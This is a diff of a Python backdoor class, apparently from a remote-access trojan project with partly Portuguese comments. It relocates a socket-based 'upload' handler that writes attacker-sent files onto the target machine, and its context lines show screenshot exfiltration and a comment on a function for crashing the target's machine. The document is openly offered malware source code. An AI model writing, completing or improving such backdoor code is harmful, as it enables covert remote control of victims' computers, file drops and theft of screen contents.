@@ -106,28 +106,8 @@ class Backdoor:
                         except Exception as e:
                             self.sock.send(str(e).encode())
 
-                    # Upload File ta executando como comando no termianl.. mudar para if, sel
-
-                    if message_command_descrypt.startswith("upload "):
-
-                        up_filename = message_command_descrypt.split(" ")[2]
-
-                    
-                        up_filesize = self.sock.recv(1024).decode("utf-8")
-                    
-                        int_filesize = int(up_filesize)
-
-                        up_data = b""
-                        while len(up_data) < int_filesize:
-                            up_data += self.sock.recv(int_filesize)
-        
-                        with open(up_filename,"wb") as up:
-                            up.write(up_data)
-
-                        self.sock.send(f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
-                        
-                    
-                        
+                                
+                                    
 
                     # Downloading files
 
@@ -195,6 +175,23 @@ class Backdoor:
                             self.sock.send(screenshot_data)
                             
 
+                    # Upload File ta executando como comando no termianl.. mudar para if, sel
+
+                    if message_command_descrypt.startswith("upload "):
+
+                        up_filesize = self.sock.recv(1024).decode("latin1")
+                        up_filename = message_command_descrypt.split(" ")[2]
+    
+                        int_filesize = int(up_filesize)
+
+                        up_data = b""
+                        while len(up_data) < int_filesize:
+                            up_data += self.sock.recv(int_filesize)
+        
+                        with open(up_filename,"wb") as up:
+                            up.write(up_data)
+
+                        self.sock.send(f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
 
 
                     # This is for crash the target's machine
